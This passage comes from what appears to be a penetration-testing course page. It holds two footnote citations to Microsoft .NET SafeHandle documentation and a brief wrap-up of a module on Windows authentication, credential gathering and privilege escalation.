(Microsoft, 2020), [https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.safehandle.dangerousgethandle?view=netframework-4.8](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.safehandle.dangerousgethandle?view=netframework-4.8) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5360-9)

10

(Microsoft, 2020), [https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.safehandle?view=netframework-4.8](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.safehandle?view=netframework-4.8) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5360-10)

## 15.5. Wrapping Up

In this module, we discussed the various authentication mechanisms and privilege levels implemented in Windows and demonstrated various tools and techniques to obtain credentials and escalate our privileges.